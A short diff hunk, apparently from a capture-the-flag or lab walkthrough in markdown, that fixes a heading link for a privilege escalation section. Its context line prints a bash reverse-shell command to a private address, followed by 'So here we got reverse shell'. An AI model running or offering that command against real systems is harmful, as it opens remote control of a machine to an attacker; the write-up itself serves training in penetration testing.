@@ -95,7 +95,7 @@ bash -i >& /dev/tcp/192.168.99.48/9001 0>&1
 
 So here we got reverse shell
 
-# [#heaader-2]Privillege Escalation
+# [](#header-2)Privillege Escalation
 
 So here we check the kernal version 
 
